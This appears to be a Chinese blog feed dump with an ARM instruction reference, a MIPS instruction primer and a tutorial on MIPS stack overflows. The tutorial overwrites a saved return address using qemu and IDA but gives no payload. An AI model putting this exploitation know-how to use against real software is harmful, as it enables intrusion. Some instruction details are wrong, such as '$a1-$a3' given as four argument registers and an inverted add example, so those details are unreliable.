存放第1 个操作数的协处理器寄存器。</p><p>CRm 存放第2 个操作数的协处理器寄存器。</p><p>Opcode2 可选的协处理器特定操作码。</p></blockquote><p>ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0</p><p>CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1</p></blockquote><h4 id="LDC-协处理器数据读取指令"><a href="#LDC-协处理器数据读取指令" class="headerlink" title="LDC  协处理器数据读取指令"></a>LDC  协处理器数据读取指令</h4><blockquote><p>LDC{cond}{L} coproc,CRd,&lt;地址&gt;</p><p>L 可选后缀，指明是长整数传送。</p><p>coproc 指令操作的协处理器名。标准名为pn，n 为0～15</p><p>CRd 作为目标寄存的协处理器寄存器。</p><p>&lt;地址&gt; 指定的内存地址</p></blockquote><p>LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>LDC p5,c2,[R2,#4];读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中</p><p>LDC p6,c2,[R1] ;读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中</p></blockquote><h4 id="STC-协处理器数据写入指令"><a href="#STC-协处理器数据写入指令" class="headerlink" title="STC 协处理器数据写入指令"></a>STC 协处理器数据写入指令</h4><blockquote><p>STC{cond}{L} coproc,CRd,&lt;地址&gt;</p><p>L 可选后缀，指明是长整数传送。</p><p>coproc 指令操作的协处理器名。标准名为pn，n 为0～15</p><p>CRd 作为目标寄存的协处理器寄存器。</p><p>&lt;地址&gt; 指定的内存地址</p></blockquote><p>STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>STC p5,c1,[R0]</p><p>STC p5,c1,[Ro,#-0x04]</p></blockquote><h4 id="MCR-ARM寄存器到协处理器寄存器的数据传送指令"><a href="#MCR-ARM寄存器到协处理器寄存器的数据传送指令" class="headerlink" title="MCR ARM寄存器到协处理器寄存器的数据传送指令"></a>MCR ARM寄存器到协处理器寄存器的数据传送指令</h4><blockquote><p>MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</p><p>coproc 指令操作的协处理器名。标准名为pn，n 为0～15。</p><p>cpcodel 协处理器的特定操作码。</p><p>RD 作为目标寄存器。</p><p>CRn 存放第1 个操作数的协处理器寄存器</p><p>CRm 存放第2 个操作数的协处理器寄存器。</p><p>Opcode2 可选的协处理器特定操作码。</p></blockquote><p>MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>MCR p6,2,R7,c1,c2,</p><p>MCR P7,0,R1,c3,c2,1,</p></blockquote><h4 id="MRC-协处理器寄存器到ARM寄存器到的数据传送指令"><a href="#MRC-协处理器寄存器到ARM寄存器到的数据传送指令" class="headerlink" title="MRC 协处理器寄存器到ARM寄存器到的数据传送指令"></a>MRC 协处理器寄存器到ARM寄存器到的数据传送指令</h4><blockquote><p>MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</p><p>coproc 指令操作的协处理器名。标准名为pn，n为0～15。</p><p>opcodel 协处理器的特定操作码。</p><p>Rd 作为目标寄存器。</p><p>CRn 存放第1 个操作数的协处理器寄存器。</p><p>CRm 存放第2 个操作数的协处理器寄存器。</p><p>opcode2 可选的协处理器特定操作码。</p></blockquote><p>MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断</p><blockquote><p>MRC p5,2,R2,c3,c2</p><p>MRC p7,0,R0,c1,c2,1</p></blockquote><h3 id="ARM-杂项指令"><a href="#ARM-杂项指令" class="headerlink" title="ARM 杂项指令"></a>ARM 杂项指令</h3><h4 id="SWI-软中断指令"><a href="#SWI-软中断指令" class="headerlink" title="SWI 软中断指令"></a>SWI 软中断指令</h4><blockquote><p>SWI{cond} immed_24</p><p>immed_24 24 位立即数，值为0～16777215 之间的整数。</p></blockquote><p>SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式</p><blockquote><p>SWI 0 ;软中断，中断立即数为0</p><p>SWI 0x123456 ;软中断，中断立即数为0x123456</p></blockquote><div class="code-wrapper"><pre><code class="hljs armasm">使用<span class="hljs-keyword">SWI</span> 指令时，通常使用以下两种方法进行传递参数，<span class="hljs-keyword">SWI</span> 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的<span class="hljs-keyword">SWI</span> 指令，以取得<span class="hljs-number">24</span> 位立即数。    （A）指令<span class="hljs-number">24</span> 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R0</span>,<span class="hljs-number">#34</span>   <span class="hljs-comment">;设置了功能号为34</span>    <span class="hljs-keyword">SWI</span> <span class="hljs-number">12</span>     <span class="hljs-comment">;调用12 号软中断</span>    （B）指令中的<span class="hljs-number">24</span> 位立即数被忽略，用户请求的服务类型由寄存器<span class="hljs-built_in">R0</span> 的值决定，参数通过其它的通用寄存器传递。    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R0</span>,<span class="hljs-number">#12</span>   <span class="hljs-comment">;调用12 号软中断</span>    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R1</span>,<span class="hljs-number">#34</span>   <span class="hljs-comment">;设置子功能号为34</span>    <span class="hljs-keyword">SWI</span> <span class="hljs-number">0</span>    <span class="hljs-comment">;</span>在<span class="hljs-keyword">SWI</span> 异常中断处理程序中，取出<span class="hljs-keyword">SWI</span> 立即数的步骤为：首先确定引起软中断的SWI指令是<span class="hljs-meta">ARM</span>指令还时<span class="hljs-meta">Thumb</span> 指令，这可通过对SPSR 访问得到：然后要取得该<span class="hljs-keyword">SWI</span> 指令的地址，这可通过访问<span class="hljs-built_in">LR</span> 寄存器得到：接着读出指令，分解出立即数。    读出<span class="hljs-keyword">SWI</span> 立即数：    T_bit <span class="hljs-meta">EQU</span> <span class="hljs-number">0x20</span>    SWI_Hander    STMFD <span class="hljs-built_in">SP</span>!,&#123;R0_R3,<span class="hljs-built_in">R12</span>,<span class="hljs-built_in">LR</span>&#125;    <span class="hljs-comment">;现场保护</span>    <span class="hljs-keyword">MRS</span> <span class="hljs-built_in">R0</span>,SPSR           <span class="hljs-comment">;读取SPSR</span>    STMFD <span class="hljs-built_in">SP</span>!,&#123;<span class="hljs-built_in">R0</span>&#125;           <span class="hljs-comment">;保存SPSR</span>    <span class="hljs-keyword">TST</span> <span class="hljs-built_in">R0</span>,<span class="hljs-symbol">#T_bit</span>           <span class="hljs-comment">;测试T标志位</span>    LDRNEH <span class="hljs-built_in">R0</span>,[<span class="hljs-built_in">LR</span>,#-<span class="hljs-number">2</span>]        <span class="hljs-comment">;若是Thumb指令，读取指令码(16 位)</span>    <span class="hljs-keyword">BICNE</span> <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0xFF00</span>      <span class="hljs-comment">;取得Thumb 指令的8 位立即数</span>    <span class="hljs-keyword">LDREQ</span> <span class="hljs-built_in">R0</span>,[<span class="hljs-built_in">LR</span>,#-<span class="hljs-number">4</span>]         <span class="hljs-comment">;若是ARM 指令，读取指令码(32 位)</span>    BICNQ <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0xFF00000</span>      <span class="hljs-comment">;取得ARM 指令的24 位立即数</span>    …    <span class="hljs-keyword">LDMFD</span> <span class="hljs-built_in">SP</span>!,&#123;<span class="hljs-built_in">R0</span>-<span class="hljs-built_in">R3</span>,<span class="hljs-built_in">R12</span>,<span class="hljs-built_in">PC</span>&#125;^ <span class="hljs-comment">;SWI 异常中断返回</span></code></pre></div><h3 id="MRS-读状态寄存器指令"><a href="#MRS-读状态寄存器指令" class="headerlink" title="MRS 读状态寄存器指令"></a>MRS 读状态寄存器指令</h3><blockquote><p>MRS{cond} Rd ,psr</p><p>Rd 目标寄存器。Rd 不允许为R15。</p><p>psr CPSR 或SPSR</p></blockquote><p>在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中</p><p>MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许&#x2F;禁止IRQ&#x2F;FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来</p><blockquote><p>MRS R1,CPSR   ;将CPSR状态寄存器读取，保存到R1 中</p><p>MRS R2,SPSR   ;将SPSR状态寄存器读取，保存到R2 中</p></blockquote><div class="code-wrapper"><pre><code class="hljs armasm">使能IRQ 中断例程：        ENABLE_IRQ        <span class="hljs-keyword">MRS</span> <span class="hljs-built_in">R0</span>,<span class="hljs-keyword">CPSR</span>        <span class="hljs-keyword">BIC</span> <span class="hljs-built_in">R0</span>。<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0x80</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-built_in">R0</span>        <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">PC</span>,<span class="hljs-built_in">LR</span>禁能IRQ 中断例程：        DISABLE_IRQ        <span class="hljs-keyword">MRS</span> <span class="hljs-built_in">R0</span>,<span class="hljs-keyword">CPSR</span>        <span class="hljs-keyword">ORR</span> <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0x80</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-built_in">R0</span>        <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">PC</span>,<span class="hljs-built_in">LR</span></code></pre></div><h4 id="MSR-写状态寄存器指令"><a href="#MSR-写状态寄存器指令" class="headerlink" title="MSR 写状态寄存器指令"></a>MSR 写状态寄存器指令</h4><blockquote><p>MSR{cond} psr_fields,#immed_8r</p><p>MSR{cond} psr_fields,Rm</p><p>其中： psr CPSR 或SPSR</p><p>fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)：</p><p>c 控制域屏蔽字节(psr[7…0])</p><p>x 扩展域屏蔽字节(psr[15…8])</p><p>s 状态域屏蔽字节(psr[23。…16])</p><p>f 标志域屏蔽字节(psr[31…24])</p><p>immed_8r 要传送到状态寄存器指定域的立即数，8 位。</p><p>Rm 要传送到状态寄存器指定域的数据的源寄存器。</p></blockquote><p>在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR</p><blockquote><p>MSR CPSR_c,#0xD3 ;CPSR[7…0]&#x3D;0xD3，即切换到管理模式。</p><p>MSR CPSR_cxsf,R3 ;CPSR&#x3D;R3</p></blockquote><p>只有在特权模式下才能修改状态寄存器。<br>程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态&#x2F;Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许&#x2F;禁止IRQ&#x2F;FIQ 中断等设置。</p><div class="code-wrapper"><pre><code class="hljs armasm">堆栈指令实始化例程：        INITSTACK        <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">LR</span> <span class="hljs-comment">;保存返回地址</span>    <span class="hljs-comment">;设置管理模式堆栈</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-number">#0xD3</span>        <span class="hljs-keyword">LDR</span> <span class="hljs-built_in">SP</span>,StackSvc    <span class="hljs-comment">;设置中断模式堆栈</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-number">#0xD2</span>        <span class="hljs-keyword">LDR</span> <span class="hljs-built_in">SP</span>,StackIrq</code></pre></div><h3 id="ARM-伪指令"><a href="#ARM-伪指令" class="headerlink" title="ARM 伪指令"></a>ARM 伪指令</h3><h4 id="ADR-小范围的地址读取伪指令"><a href="#ADR-小范围的地址读取伪指令" class="headerlink" title="ADR 小范围的地址读取伪指令"></a>ADR 小范围的地址读取伪指令</h4><blockquote><p>ADR{cond} register,exper</p><p>register 加载的目标寄存器。</p><p>exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。 </p><p>对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。</p></blockquote><p>ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败</p><blockquote><p>LOOP MOV R1, #0xF0</p><p>…</p><p>ADR R2, LOOP     ;将LOOP 的地址放入R2</p><p>ADR R3, LOOP+4</p><p>可以用ADR 加载地址，实现查表：</p><p>…</p><p>ADR R0,DISP_TAB   ;加载转换表地址</p><p>LDRB R1,[R0,R2]   ;使用R2作为参数，进行查表</p><p>…</p><p>DISP_TAB</p><p>DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90</p></blockquote><h4 id="ADRL-中等范围的地址读取伪指令"><a href="#ADRL-中等范围的地址读取伪指令" class="headerlink" title="ADRL 中等范围的地址读取伪指令"></a>ADRL 中等范围的地址读取伪指令</h4><blockquote><p>ADR{cond} register,exper</p><p>register 加载的目标寄存器。</p><p>expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。</p></blockquote><p>ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败</p><blockquote><p>ADRL R0,DATA_BUF</p><p>…</p><p>ADRL R1 DATA_BUF+80</p><p>…</p><p>DATA_BUF</p><p>SPACE 100   ;定义100 字节缓冲区</p><p>可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：<br>…</p><p>ADR LR,RETURNI       ;设置返回地址</p><p>ADRL R1Thumb_Sub+1    ;取得了Thumb 子程序入口地址，且R1 的0 位置1</p><p>BX R1           ;调用Thumb子程序，并切换处理器状态</p><p>RETURNI</p><p>…</p><p>CODE16</p><p>Thumb_Sub</p><p>MOV R1,#10</p><p>…</p></blockquote><h4 id="LDR-大范围的地址读取伪指令"><a href="#LDR-大范围的地址读取伪指令" class="headerlink" title="LDR 大范围的地址读取伪指令"></a>LDR 大范围的地址读取伪指令</h4><blockquote><p>LDR{cond} register,&#x3D;expr&#x2F;label_expr</p><p>register 加载的目标寄存器</p><p>expr 32 位立即数。</p><p>label_expr 基于PC 的地址表达式或外部表达式。</p></blockquote><p>LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量</p><blockquote><p>LDR R0,&#x3D;0x123456     ;加载32 位立即数0x12345678</p><p>LDR R0,&#x3D;DATA_BUF+60  ;加载DATA_BUF 地址+60</p><p>…</p><p>LTORG           ;声明文字池</p><p>伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数：</p><p>…</p><p>LDR R0,&#x3D;IOPIN ;加载GPIO 寄存器IOPIN 的地址</p><p>LDR R1,[R0] ;读取IOPIN 寄存器的值</p><p>…</p><p>LDR R0,&#x3D;IOSET</p><p>LDR R1,&#x3D;0x00500500</p><p>STR R1,[R0] ;IOSET&#x3D;0x00500500</p><p>…</p><p>从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“&#x3D;”号</p></blockquote><h4 id="NOP-空操作伪指令"><a href="#NOP-空操作伪指令" class="headerlink" title="NOP  空操作伪指令"></a>NOP  空操作伪指令</h4><p>NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等</p><blockquote><p>使用就单NOP</p></blockquote><h3 id="ARM寻址"><a href="#ARM寻址" class="headerlink" title="ARM寻址"></a>ARM寻址</h3><h4 id="立即数寻址"><a href="#立即数寻址" class="headerlink" title="立即数寻址"></a>立即数寻址</h4><p>立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%”</p><h4 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h4><p>操作数的地址在寄存器中 </p><p>ADD R0，R1，[R2]</p><h4 id="基址变址寻址"><a href="#基址变址寻址" class="headerlink" title="基址变址寻址"></a>基址变址寻址</h4><p>将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址</p><p>ADD R0，R1，[R2]</p><h4 id="多寄存器寻址"><a href="#多寄存器寻址" class="headerlink" title="多寄存器寻址"></a>多寄存器寻址</h4><p>一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值</p><p>LDMIA R0，{R1，R2，R3，R4}</p><h4 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h4><p>以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址</p><p>例如：BL NEXT</p><h3 id="ARM堆栈的增长方式"><a href="#ARM堆栈的增长方式" class="headerlink" title="ARM堆栈的增长方式"></a>ARM堆栈的增长方式</h3><p>当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack)</p><p>当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack)</p><p>递增堆栈：向高地址方向生长</p><p>递减堆栈：向低地址方向生长</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIPS栈溢出原理</title>
    <link href="/article/bd2e4070.html"/>
    <url>/article/bd2e4070.html</url>
    
    <content type="html"><![CDATA[<h1 id="MIPS的函数调用"><a href="#MIPS的函数调用" class="headerlink" title="MIPS的函数调用"></a>MIPS的函数调用</h1><p>小知识：</p><blockquote><p>Mips 调用函数时不会将返回地址放入栈中，而在非叶子函数中，为了调用下一个函数，会将上一个函数的返回地址压栈</p><p>叶子函数，即该函数中不会调用任何其他函数</p><p>非叶子函数，即该函数需要调用其他函数</p></blockquote><p>mips的函数调用过程</p><p>当函数A执行到调用函数B的指令时，函数调用指令复制当前pc寄存器的值到ra寄存器中，即ra中存放返回地址</p><blockquote><p>他这个没有专门的控制ra的指令，在ja指令执行的时候，给ra赋值了</p></blockquote><p>程序跳转到函数B的时候，如果是非叶子函数，函数B会先把函数A的返回地址压栈（即ra寄存器的值压栈），叶子函数没有这个操作，返回地址就只存在于ra寄存器中</p><blockquote><p>main函数一般是一个非叶子函数，我们几乎可以在任何mian开头看到 <code>sw $ra,0x20+var_s4($sp)</code>这条指令</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141121629.png" alt="image-20220402141121629"></p><p>函数B执行完之后，叶子函数直接使用<code>jr $ra</code>指令返回函数A，而非叶子函数则需要，从堆栈中取出返回地址，然后将返回地址放入ra寄存器，再使用<code>jr $ra</code>指令</p><h2 id="下面是两个程序（叶子和非叶子）的分析"><a href="#下面是两个程序（叶子和非叶子）的分析" class="headerlink" title="下面是两个程序（叶子和非叶子）的分析"></a>下面是两个程序（叶子和非叶子）的分析</h2><h3 id="叶子函数"><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141131544.png" alt="image-20220402141131544"></p><p>这个程序中，add函数为叶子函数，我们去分析add函数调用之前做了什么。</p><blockquote><p>这里使用<code>mipsel-linux-gnu-gcc -o tree tree.c -static</code>进行编译</p><p>然后使用<code>qemu-mipsel -g 1234 tree</code>与ida连用的动态调试</p><p>IDA remote另一篇文章会详细讲，这里就不赘述</p></blockquote><p>下断点到main函数，能看到在<code>400578</code>处有看到将ra压栈的操作，这个就是操作系统的某个地址。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141137056.png" alt="image-20220402141137056"></p><p>重点在<code>0040059c</code>这个行，调用add函数，先不关心参数调用，只看ra寄存器的相关操作</p><p>执行完00400578后，寄存器以及栈中的内容</p><p><img src="/../../../Library/Application%20Support/typora-user-images/image-20210825095723949.png" alt="image-20210825095723949"></p><p>继续执行至0040059c，此时ra值没有改变</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141148995.png" alt="image-20220402141148995"></p><p>执行jal add</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141156455.png" alt="image-20220402141156455"></p><p>跳转过来之后，ra的值变了，值正好是jr add的下一条可用指令（nop的目的只是为了对齐）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141203617.png" alt="image-20220402141203617"></p><p>再看add的所有指令，会发现，只有跳回main函数指令出现了ra寄存器</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141210131.png" alt="image-20220402141210131"></p><h3 id="非叶子函数"><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141216124.png" alt="image-20220402141216124"></p><p>add中调用了printf()函数。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141223617.png" alt="image-20220402141223617"></p><p>执行进入add函数，与叶子函数相同</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141230705.png" alt="image-20220402141230705"></p><p>进入之后，抬高堆栈后，执行了ra压栈操作，即<code>00400544</code>这一行的操作</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141238248.png" alt="image-20220402141238248"></p><p>上图是函数执行完之后，准备返回main，在<code>0040059c</code>这行把main函数的返回地址放回ra。</p><p>然后通过<code>jr $ra</code>返回main。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>mips函数调用传递参数规则，前四个参数通过$a1- $a3寄存器传递，其他参数通过栈传递。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141246086.png" alt="image-20220402141246086"></p><p>从main函数中来看，先将参数数字放到临时栈中（蓝色框中），然后将第五个参数去取出，放入add的栈中，然后将前四个栈放到a0-a3寄存器中（红框）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141304900.png" alt="image-20220402141304900"></p><p>我们来尝试画出其栈图，下图是main函数的栈图</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141314906.png" alt="image-20220402141314906"></p><p>红框为上个函数的返回地址，蓝框为局部变量，绿的是第五个参数。</p><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>我们使用下面代码来做实验</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141342106.png" alt="image-20220402141342106"></p><p>代码大意就是从passwd这个文件读取文件。</p><p>尝试使用大量字符串</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141349030.png" alt="image-20220402141349030"></p><p>运行发现报错</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141355070.png" alt="image-20220402141355070"></p><p>栈溢出的目的是覆盖返回地址，上面说过，main一般是一个典型的非叶子函数，而且passwd文件的读取是在main中执行的，</p><p>所以我们目标应该在main刚进来的ra位置，使用ida+qemuGdb调试。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141401755.png" alt="image-20220402141401755"></p><p>运行至main</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141409333.png" alt="image-20220402141409333"></p><p>并且关注ra的值存放的位置，右键 -&gt; jump a new window</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141418631.png" alt="image-20220402141418631"></p><p>执行完ra压栈之后，栈中的数据</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141427263.png" alt="image-20220402141427263"></p><p>下面让程序读完passwd文件，这个地方有个小方法，读取一般是在循环中一个字符一个字符读的，所以向下单步执行，如果遇到多次循环，就可以尝试吧断点下载循环执行完的下一行。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141436143.png" alt="image-20220402141436143"></p><p>上图发现循环，尝试在循环外下断，不要断在nop上，情况允许就尽量断在nop下一行</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141447106.png" alt="image-20220402141447106"></p><p>ida下使用f9可以继续运行，直到下一个断点，运行到<code>00400500</code>后可以看到，地址存放的地方已经被覆盖</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141454519.png" alt="image-20220402141454519"></p><p>接下来可以使用cyclic等工具来计算长度，编写poc或exp利用。</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIPS指令集</title>
    <link href="/article/6a1d16f9.html"/>
    <url>/article/6a1d16f9.html</url>
    
    <content type="html"><![CDATA[<h1 id="MIPS指令集"><a href="#MIPS指令集" class="headerlink" title="MIPS指令集"></a>MIPS指令集</h1><p>mips （risc 精简指令集）</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>mips 有32个寄存器，编号是从$0到$31</p><p>没有强制规则，但约定用法还是引入了一堆约定名</p><p>尽量使用约定名或者叫助记符</p><p>下面是寄存器用法（截的scdn [En Takahashi]老哥的），这些东西不一定要记，尽量还是用到多查，时间久了也就记住了</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141050555.png" alt="image-20220402141050555"></p><p>比较特殊的是</p><p>$0号寄存器，他里边放的只有0，又叫0号寄存器</p><p>$31号寄存器，里边放的是函数调用指令的返回地址</p><p>$1号寄存器，又叫at，由编译器生成的复合指令使用</p><blockquote><p>d</p></blockquote><p>v0,v1不够用的话用内存</p><p>hi和lo是两个跟乘法相关的寄存器，不是通用寄存器，所以不能用在其他地方</p><h2 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h2><p>寻址方式为地址 &#x3D; <code>基地址+偏移</code></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>c中        long        int        short        char</p><p>mips    dword    word    halfword    byte</p><p>长度        8                4            2            1</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>mips所有指令都是32位的</p><p>mips指令分为三种格式</p><ol><li>R-format 其他所有的</li><li>I-format 有立即数的指令</li><li>J-format 无条件跳转</li></ol><h3 id="R-format"><a href="#R-format" class="headerlink" title="R-format"></a>R-format</h3><p>对非立即数和跳转的操作</p><p>例如：add $8, $17, $18  &#x3D;》 $18 &#x3D; $8+$17 </p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141057353.png" alt="image-20220402141057353"></p><h3 id="I-format"><a href="#I-format" class="headerlink" title="I-format"></a>I-format</h3><p>数据放到寄存器，或者放入地址</p><p>分支（判断）指令</p><p>立即数运算</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141102389.png" alt="image-20220402141102389"></p><h3 id="J-format"><a href="#J-format" class="headerlink" title="J-format"></a>J-format</h3><p>跳转，类似于jump</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141108000.png" alt="image-20220402141108000"></p><h2 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h2><p>上边指令分类其实只是一个理解，详细的看下边</p><p><strong>lb &#x2F; lh &#x2F; lw</strong> :   从存储器中读取一个byte&#x2F;half word&#x2F;word的数据到寄存器中</p><p><strong>sb &#x2F; sh &#x2F;sw</strong>:    把一个byte&#x2F;half word&#x2F;word的数据从寄存器存储到存储器中</p><p><strong>mov &#x2F; movz &#x2F; movn</strong>:    复制，n为负，z为零。mov $1,$2; movz $1,$2,$3($3为零则复制$2到$1)</p><p><strong>addi&#x2F;addiu</strong>:   把一个寄存器的内容加上一个立即数;u为不带符号加。 rd &#x3D; rs + im</p><p><strong>sub&#x2F;subu</strong>：  把两个定点寄存器的内容相减。 rd &#x3D; rs - rt</p><p><strong>div&#x2F;divu</strong>:     两个定点寄存器的内容相除。 </p><p><strong>mul&#x2F;mulu</strong>:    两个定点寄存器的内容相乘。 </p><p><strong>slt&#x2F;slti&#x2F;sltui</strong>:  如果rs的值小于rt，那么设置rd的值为1,否则设置rd的值为0。 rd &#x3D; (rs &lt; rt) ? 1 : 0 ; rd &#x3D; (rs 